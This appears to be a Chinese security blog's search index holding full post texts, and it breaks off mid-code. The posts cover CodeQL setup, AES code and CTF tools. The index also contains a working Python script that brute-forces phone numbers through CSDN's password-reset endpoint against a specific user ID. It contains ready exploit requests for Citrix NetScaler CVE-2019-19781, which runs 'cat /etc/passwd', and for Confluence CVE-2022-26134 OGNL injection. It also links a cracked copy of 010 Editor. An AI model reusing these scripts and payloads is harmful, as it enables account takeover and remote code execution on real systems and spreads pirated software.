<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSDN找回密码暴破脚本</title>
    <url>/2024/09/10/CSDN%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os </span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSession():</span><br><span class="line">    first_url = &#x27;https://passport.csdn.net/v1/api/riskControl/checkNVC?nvcValue=%7B%22a%22%3A%22FFFF00000000016C467E%22%2C%22c%22%3A%221688613163556%3A0.21894244156839582%22%2C%22d%22%3A%22nvc_other%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidToken%22%3A%22T2gACAQzhrGorT9mwV5CHt-_qyy-qoMVHV2-x1zzSV0JMTq-2IbplBR6wmc9qMOw0rM%3D%22%7D%2C%22j%22%3A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23O8%2BrQCV1zzZLYQo2LxcuAtSogFzRsrSXzeIuFE%2FW9FXQwElWDheX2fz1tBG9m45aV0bZ16vLI3DbQQxhMSMW0WOSrC4qlbzxhAUpJibRzzrfiXc9ltQzzPzbVXl%2FlbnUpDc%2BI3JjzHOb2XU%2BlPhtzPrC0LJBUHzrRHKBorvZrI7Zbs5zKXca0suOcyvTdklovdhyqxLJdFJFoZ5IGByma9AMKE9xgSD4xSLOdIY8M8P0zlMxKoAiFTZztbAc0dIsrz97nUSgbxm2vr%2FfV%2BwD0YKmqF1FDyGptA3Qm5Z8sq%2BxDXLf4vAUDFLfsWU4QMP2mALdCEkfxE6weX5tZrCdl3tl%2BhqgqAcSSBKd2OWA8UXXQU%2FTDPFfHTuZM3YOMl7U7N8X9QIa%2BQE3pvx4yEpV%2FrmAAeWXDYVhCma8SAgSdWLR3B5Cv%2BPSJIjnUt%2FQfzMPdyJecE2sCg4qNfZO%2BLQ4VvV0RxEZapJEujmcqga8bsn0qUw2NDFrB1p369RXzYtBJWf3542Rlkf9bHzHeIlMGviMy%2FLg%2BnHs9MiH65A9WJrr9URNtnCu%2F8ANoHX%2F7HZAqxGBpcczsTBDOJmIFV76rqrKgWhsh2qFTEDTcLhQ3qyruyDonuZZa3aYrOL%2FGg68npZaptl6SdiKgEbV9YPELlDOfQwKoCGMHcELSiFJdc0sdFfnPZvQOvu%2FEHCZud6mctgFct9or73wGLJTxw1%2BtTYOwOtjLQqpsyy8blgfUfNoD0IdYDmtt9ErElAylgtJbVFxULNIuUXjGHenLIfVPuBCbJzfZ2G1fI7eoEUhVb6Y99lvLZg3tsKHUFCfh35mcY2d14wuv0URXljLW%2FvVXjC7z46LJvXgeTwnr%2BY72yHOvTOVFZHEkZM3o%2FvskDrEHR5zp0zkj8O20UDWErp%2FPIq%2BfzJFbJNSzjEmsZ96qcdYUfzeQxNEckY%2FAA8uXfZ40HbLVZFNMHvFZ8DYCulzWD86SXwq3leoTbLbP3zeQD3xYelBEB0gvn8BjyeqL04CMpefIVZTjDGhX4hUAH9HiitpaOwqj9CLdlUc8%2BzoPVUQxQohh%2BvEu0anApyHWJRAyZSJqZ2Z9GWfEhNnW3MDZmyRttMVFltSr36shU9XoKgb7ngZ3dNVHl3bDC61GcTLz%2B3HDMooGR0pJqQhEFS1pLcX%2FVmev0PAeG%2BBiho%2FsVOerYWijWtIVOZVuiMvvpMuu5JeFD9vi2%2FqCsF%2FhjWLx92kI%2BCYM4kkinpFae4xJjx26RGNeWHoR5TdMUMEIDQu32FkXCKoKObrq4Sxj%2BWHlpLT9hC89TfN7mbgxm7RgU2z6vWUw3c788TWUfV%2BFe%2FqjswKWN8HScXCL50jPpUWpYqQ3A4j8tLjW%2FXBpLrK4Ko8MMUNw9q9tGOOWERMtidGKKK%2BFwUDPsBF9sKdd8nF%2FriRd76z%2BNBtJ6MFz67ypFz%2FyOxS71rpL3nZCCuu8%2BDq%2Bqdg%2BYHtMtViuPpHNtH4RAiPFSSa3JjjwMxux9Tc4n2N7n17vwYzTmJhhCWmgTy88ZesWKOw43Y1hSkdYF%3D%3D%22%2C%22e%22%3A%22-S-HwVTZwas7rhgz9dDdMRSb0Yik-NL1fJ_iHaL6PtA2ufvery5t6e1OxIGoUHpc7a0IbkE_0FA-F5WgiEpV7aeWlyQyxr1LL83v6PCoc3YbWdFNpRGiSow97HJFmhSolqL2iP8Yg3b6GvpNCl1IVLomrabwMw9l_LyWBRl400CVcL8m-z_SJFzz49oiy3dHQ-6yAdbxCew0CUvbYd9efp4IKNYdh5ElOOURlWM9mtU%22%7D&amp;callBackMethod=jsonp_02755569114381595&amp;source=user&#x27;</span><br><span class="line">    first_resp = requests.get(url=first_url,verify=False)</span><br><span class="line">    cookiejar = first_resp.cookies</span><br><span class="line">    cookies = requests.utils.dict_from_cookiejar(cookiejar)</span><br><span class="line">    print(cookies[&#x27;SESSION&#x27;])</span><br><span class="line">    return cookies[&#x27;SESSION&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ennableSession(userId,session):</span><br><span class="line">    url = &#x27;https://passport.csdn.net/v1/service/usernames/&#123;&#125;?comeFrom=0&#x27;.format(userId)</span><br><span class="line">    headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=&#x27;+session&#125;</span><br><span class="line">    res = requests.get(url=url,headers=headers,verify=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">           &quot;https&quot;:&quot;http://127.0.0.1:7890&quot;&#125;</span><br><span class="line">def verifyCode(session,mobile):</span><br><span class="line">    url = &#x27;https://passport.csdn.net/v1/fpwd/sendVerifyCode&#x27;</span><br><span class="line">    data = &#123;&quot;sendType&quot;:&quot;1&quot;,&quot;code&quot;:&quot;0086&quot;,&quot;mobileOrEmail&quot;:mobile&#125;</span><br><span class="line">    headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=&#x27;+session,&#x27;Content-Type&#x27;:&#x27;application/json;charset=UTF-8&#x27;&#125;</span><br><span class="line">    resp = requests.post(url=url,data=json.dumps(data),headers=headers,verify=False,proxies=proxies)</span><br><span class="line"></span><br><span class="line">    content = resp.text</span><br><span class="line">    jd = json.loads(content)</span><br><span class="line">    if jd[&#x27;status&#x27;] == True:</span><br><span class="line">        print(mobile)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(mobile + &#x27;    &#x27;+jd[&#x27;msg&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    count = 0 </span><br><span class="line">    userId = &#x27;u013609938&#x27;</span><br><span class="line">    session = getSession()</span><br><span class="line">    ennableSession(userId,session)</span><br><span class="line">    </span><br><span class="line">    for i in range(1000,10000):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        mobile = &#x27;134&#x27;+str(i)+&#x27;2596&#x27;</span><br><span class="line">        if verifyCode(session,mobile):</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        count += 1</span><br><span class="line">        if count &gt; 9:</span><br><span class="line">            count = 0</span><br><span class="line">            session = getSession()</span><br><span class="line">            ennableSession(userId,session)</span><br><span class="line">        </span><br><span class="line">def local():</span><br><span class="line">    userId = &#x27;u013609938&#x27;</span><br><span class="line">    count = 0 </span><br><span class="line">    fp = open(&#x27;C:\\Users\\test\\Desktop\\activate.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line"></span><br><span class="line">    session = getSession()</span><br><span class="line">    ennableSession(userId,session)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lines = fp.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        # time.sleep(0.1)</span><br><span class="line">        if verifyCode(session,line.replace(&#x27;\n&#x27;,&#x27;&#x27;)):</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        count += 1</span><br><span class="line">        if count &gt; 9:</span><br><span class="line">            count = 0</span><br><span class="line">            session = getSession()</span><br><span class="line">            ennableSession(userId,session)</span><br><span class="line"></span><br><span class="line">local()</span><br><span class="line"></span><br><span class="line"># main()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-19781 citrix NetScaler 路径遍历 rce漏洞</title>
    <url>/2024/09/10/CVE-2019-19781-citrix-NetScaler-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-rce%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xx.xx.xx.xx/vpn/../vpns/services.html</span><br><span class="line">https://xx.xx.xx.xx/vpn/../vpns/smb.conf</span><br><span class="line">如果没有修复的话的会返回 http 200</span><br></pre></td></tr></table></figure>


<h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1</span><br><span class="line">Host: 192.168.3.244</span><br><span class="line">User-Agent: 1</span><br><span class="line">Connection: close</span><br><span class="line">NSC_USER: ../../../netscaler/portal/templates/jas502n</span><br><span class="line">NSC_NONCE: nsroot</span><br><span class="line">Content-Length: 97</span><br><span class="line"> </span><br><span class="line">url=http://example.com&amp;title=jas502n&amp;desc=[% template.new(&#x27;BLOCK&#x27; = &#x27;print `cat /etc/passwd`&#x27;) %]</span><br></pre></td></tr></table></figure>

<h4 id="请求上传的文件"><a href="#请求上传的文件" class="headerlink" title="请求上传的文件"></a>请求上传的文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /vpn/../vpns/portal/jas502n.xml HTTP/1.1</span><br><span class="line">Host: 192.168.3.244</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">NSC_USER: nsroot</span><br><span class="line">NSC_NONCE: nsroot</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>AES-CBC加密</title>
    <url>/2024/09/10/AES-CBC%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 密钥（key）, 密斯偏移量（iv） CBC模式加密</span><br><span class="line"></span><br><span class="line">def AES_Encrypt(key, data, vi):</span><br><span class="line">    pad = lambda s: s + (16 - len(s) % 16) * chr(16 - len(s) % 16)</span><br><span class="line">    data = pad(data)</span><br><span class="line">    # 字符串补位</span><br><span class="line">    cipher = AES.new(key.encode(&#x27;utf8&#x27;), AES.MODE_CBC, vi.encode(&#x27;utf8&#x27;))</span><br><span class="line">    encryptedbytes = cipher.encrypt(data.encode(&#x27;utf8&#x27;))</span><br><span class="line">    # 加密后得到的是bytes类型的数据</span><br><span class="line">    encodestrs = base64.b64encode(encryptedbytes)</span><br><span class="line">    # 使用Base64进行编码,返回byte字符串</span><br><span class="line">    enctext = encodestrs.decode(&#x27;utf8&#x27;)</span><br><span class="line">    # 对byte字符串按utf-8进行解码</span><br><span class="line">    return enctext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def AES_Decrypt(key, data, vi):</span><br><span class="line">    data = data.encode(&#x27;utf8&#x27;)</span><br><span class="line">    res = base64.decodebytes(data)</span><br><span class="line">    # 将加密数据转换位bytes类型数据</span><br><span class="line">    cipher = AES.new(key.encode(&#x27;utf8&#x27;), AES.MODE_CBC, vi.encode(&#x27;utf8&#x27;))</span><br><span class="line">    text_decrypted = cipher.decrypt(res)</span><br><span class="line">    unpad = lambda s: s[0:-s[-1]]</span><br><span class="line">    text_decrypted = unpad(text_decrypted)</span><br><span class="line">    # 去补位</span><br><span class="line">    text_decrypted = text_decrypted.decode(&#x27;utf8&#x27;)</span><br><span class="line">    return text_decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">	key = &#x27;sw@M6A9sUq6e#Yg$&#x27;</span><br><span class="line">	iv = &#x27;1234567890123456&#x27;</span><br><span class="line">	data_text = &#x27;1234&#x27;</span><br><span class="line">	enctext = &#x27;u1+Eby4bwXGlVOEAzCW/GsNE14iHeMYtpxzRUA199zg=&#x27;</span><br><span class="line">	# enctext = AES_Encrypt(key, data_text, iv)</span><br><span class="line">	text_decrypted = AES_Decrypt(key, enctext, iv)</span><br><span class="line">	# print(&quot;原始文本:&quot;, data_text)</span><br><span class="line">	# print(&quot;AES加密后:&quot;, enctext)</span><br><span class="line">	print(&quot;AES解密后:&quot;, text_decrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF常用工具汇总</title>
    <url>/2024/09/10/CTF%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="1-图片相关"><a href="#1-图片相关" class="headerlink" title="1.图片相关"></a>1.图片相关</h2><h3 id="01editor"><a href="#01editor" class="headerlink" title="01editor"></a>01editor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.sweetscape.com/download/010editor/</span><br><span class="line">破解：</span><br><span class="line">https://down.52pojie.cn/Tools/Editors/010_Editor_All_Versions_For_Windows_CracKed.7z</span><br></pre></td></tr></table></figure>


<h2 id="2-音频相关"><a href="#2-音频相关" class="headerlink" title="2.音频相关"></a>2.音频相关</h2><h3 id="音频编辑工具-【Audacity】"><a href="#音频编辑工具-【Audacity】" class="headerlink" title="音频编辑工具-【Audacity】"></a>音频编辑工具-【Audacity】</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.audacityteam.org/download/windows/</span><br></pre></td></tr></table></figure>

<h3 id="音频LSB隐写-工具【silenteye-】"><a href="#音频LSB隐写-工具【silenteye-】" class="headerlink" title="音频LSB隐写-工具【silenteye 】"></a>音频LSB隐写-工具【silenteye 】</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sourceforge.net/projects/silenteye/files/Application/0.4/silenteye-0.4.1-win32.exe/download</span><br></pre></td></tr></table></figure>



<h2 id="3-网络相关"><a href="#3-网络相关" class="headerlink" title="3.网络相关"></a>3.网络相关</h2><h3 id="RoutePassView-查看流量信息"><a href="#RoutePassView-查看流量信息" class="headerlink" title="RoutePassView- 查看流量信息"></a>RoutePassView- 查看流量信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.nirsoft.net/utils/router_password_recovery.html#google_vignette</span><br></pre></td></tr></table></figure>

<h2 id="4-系统相关"><a href="#4-系统相关" class="headerlink" title="4.系统相关"></a>4.系统相关</h2><h3 id="Windows无法显示【-】需要在linux下进行解压-7z-e-文件名"><a href="#Windows无法显示【-】需要在linux下进行解压-7z-e-文件名" class="headerlink" title="Windows无法显示【:】需要在linux下进行解压 7z e 文件名"></a>Windows无法显示【:】需要在linux下进行解压 7z e 文件名</h3>]]></content>
      <tags>
        <tag>工具</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE -2022-26134漏洞 (Confluence OGNL 注入rce漏洞)</title>
    <url>/2024/09/10/CVE-2022-26134%E6%BC%8F%E6%B4%9E-Confluence-OGNL-%E6%B3%A8%E5%85%A5rce%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h4 id="版本范围："><a href="#版本范围：" class="headerlink" title="版本范围："></a>版本范围：</h4><p>Confluence Server&amp;Data Center ≥ 1.3.0</p>
<p>Atlassian Confluence Server and Data Center &lt;7.4.17<br>Atlassian Confluence Server and Data Center &lt;7.13.7<br>Atlassian Confluence Server and Data Center &lt;7.14.3<br>Atlassian Confluence Server and Data Center &lt;7.15.2<br>Atlassian Confluence Server and Data Center &lt;7.16.4<br>Atlassian Confluence Server and Data Center &lt;7.17.4<br>Atlassian Confluence Server and Data Center &lt;7.18.</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx[必填]</span><br><span class="line">User-Agent: python-requests/2.25.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>exp</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL环境搭建</title>
    <url>/2024/09/10/CodeQL%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="0x0-工具准备"><a href="#0x0-工具准备" class="headerlink" title="0x0 工具准备"></a>0x0 工具准备</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CodeQL [1]</span><br><span class="line">codeql-cli-binaries [2]</span><br><span class="line">mvn [3]</span><br><span class="line">jdk-all [4]</span><br><span class="line">vscode [5]</span><br><span class="line">vscode codeql插件 </span><br></pre></td></tr></table></figure>

<h4 id="0x1-环境配置"><a href="#0x1-环境配置" class="headerlink" title="0x1 环境配置"></a>0x1 环境配置</h4><h5 id="JDK配置"><a href="#JDK配置" class="headerlink" title="JDK配置"></a>JDK配置</h5><p>windows路径</p>
<blockquote>
<p>C:\Users\0xkda.m2\toolchains.xml</p>
</blockquote>
<p>mac osx路径</p>
<blockquote>
<p>~&#x2F;.m2&#x2F;toolchains.xml</p>
</blockquote>
<p>根据实际路径和版本进行配置即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF8&quot;?&gt;</span><br><span class="line">&lt;toolchains&gt;</span><br><span class="line">  &lt;!-- JDK toolchains --&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.7&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.7.0_80&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">    &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;11&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk-11.0.13&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.8&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk1.8.0_291&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;/type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;9&lt;/version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;/vendor&gt;</span><br><span class="line">    &lt;/provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;C:\Program Files\Java\jdk-9&lt;/jdkHome&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">  &lt;/toolchain&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- other toolchains --&gt;</span><br><span class="line">&lt;/toolchains&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="mvn配置"><a href="#mvn配置" class="headerlink" title="mvn配置"></a>mvn配置</h5><p>下载mvn解压后，把mvn.exe所在目录加入到环境变量</p>
<h5 id="codeql-cli-binaries配置"><a href="#codeql-cli-binaries配置" class="headerlink" title="codeql-cli-binaries配置"></a>codeql-cli-binaries配置</h5><p>下载codeql-cli文件，解压，<em><strong>加入环境变量</strong></em>，记住解压路径，后续vscode需要填写</p>
<h5 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h5><p>首先下载codeql插件<br><img src="/images/blog/57ce484f5d66179dc7762ceff1b30cc3.png"></p>
<p>然后设置codeql-cli，点击右下角的<em><strong>设置</strong></em>按钮-&gt; <em><strong>扩展设置</strong></em><br><img src="/images/blog/e76b36b6cf4a84d7676f3f99ffe0818e.png"></p>
<p>在Executable Path中填入我们上面下载的codeql-cli中的codeql.exe文件路径<br><img src="/images/blog/d0465d625b38296f5e23b3c4abbdf489.png"></p>
<p>设置查询线程数，默认是1个线程，太慢了，这里可以根据自己的配置调整<br><img src="/images/blog/a13ae6e244c8a46fa5c31defc18296cc.png"></p>
<h4 id="0x-链接"><a href="#0x-链接" class="headerlink" title="0x 链接"></a>0x 链接</h4><p>[1] <a href="https://github.com/github/codeql">https://github.com/github/codeql</a><br>[2] <a href="https://github.com/github/codeql-cli-binaries/releases">https://github.com/github/codeql-cli-binaries/releases</a><br>[3] <a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a><br>[4] <a href="https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase9-archive-downloads.html</a><br>[5] <a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p>
]]></content>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL简单尝试</title>
    <url>/2024/09/10/CodeQL%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<h4 id="0x1-使用-vscode-codeql-starter"><a href="#0x1-使用-vscode-codeql-starter" class="headerlink" title="0x1 使用 vscode-codeql-starter"></a>0x1 使用 vscode-codeql-starter</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone --recursive https://github.com/github/vscode-codeql-starter</span><br></pre></td></tr></table></figure>
<p> vs code导入工程<br><img src="/images/blog/d50ad32374ddc36361608ff0983a8a87.png"></p>
<h4 id="0x2-下载需要审计的项目-配置好环境"><a href="#0x2-下载需要审计的项目-配置好环境" class="headerlink" title="0x2 下载需要审计的项目-配置好环境"></a>0x2 下载需要审计的项目-配置好环境</h4><p>这里以log4j为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/logging-log4j2.git</span><br><span class="line">git checkout be881e5</span><br></pre></td></tr></table></figure>
<p>由于我们这次分析的主要是log4j-core和log4j-api中的内容，所以打开根目录的Pom.xml注释下面的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;modules&gt;</span><br><span class="line">    &lt;module&gt;log4j-api-java9&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-api&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core-java9&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core&lt;/module&gt;</span><br><span class="line">    &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-core-its&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-1.2-api&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-slf4j-impl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-to-slf4j&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jcl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-flume-ng&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-taglib&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jmx-gui&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-samples&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-bom&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jpa&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-couchdb&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-mongodb3&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-cassandra&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-web&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-perf&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-iostreams&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jul&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-jpl&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-liquibase&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-appserver&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-osgi&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-docker&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span><br><span class="line">  &lt;/modules&gt;</span><br></pre></td></tr></table></figure>


<h4 id="0x3-使用codeql生成数据库"><a href="#0x3-使用codeql生成数据库" class="headerlink" title="0x3 使用codeql生成数据库"></a>0x3 使用codeql生成数据库</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeql database create Log4jDB --language=java --overwrite --command=&quot;mvn clean install -Dmaven.test.skip=true&quot;</span><br></pre></td></tr></table></figure>

<h4 id="0x4-vscode导入codeql生成的数据库"><a href="#0x4-vscode导入codeql生成的数据库" class="headerlink" title="0x4 vscode导入codeql生成的数据库"></a>0x4 vscode导入codeql生成的数据库</h4><p><strong>From a folder</strong><br><img src="/images/blog/4fbfb7f07b7c1a2199792c2f5797ca44.png"><br><img src="/images/blog/7c149cedf37489616fee710205dd8ec0.png"></p>
<p><img src="/images/blog/fc510352b6c529211d6b6ddc0aaa8ec5.png"></p>
<h4 id="0x4-编辑查询规则去寻找漏洞"><a href="#0x4-编辑查询规则去寻找漏洞" class="headerlink" title="0x4 编辑查询规则去寻找漏洞"></a>0x4 编辑查询规则去寻找漏洞</h4><p>如下是查询log4j中jndi漏洞的规则 ，别人写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @name Tainttrack Context lookup</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class Context extends RefType &#123;</span><br><span class="line">  Context() &#123;</span><br><span class="line">    this.hasQualifiedName(&quot;javax.naming&quot;, &quot;Context&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.hasQualifiedName(&quot;javax.naming&quot;, &quot;InitialContext&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.hasQualifiedName(&quot;org.springframework.jndi&quot;, &quot;JndiCallback&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.hasQualifiedName(&quot;org.springframework.jndi&quot;, &quot;JndiTemplate&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.hasQualifiedName(&quot;org.springframework.jndi&quot;, &quot;JndiLocatorDelegate&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.hasQualifiedName(&quot;org.apache.shiro.jndi&quot;, &quot;JndiCallback&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.getQualifiedName().matches(&quot;%JndiCallback&quot;)</span><br><span class="line">    or</span><br><span class="line">    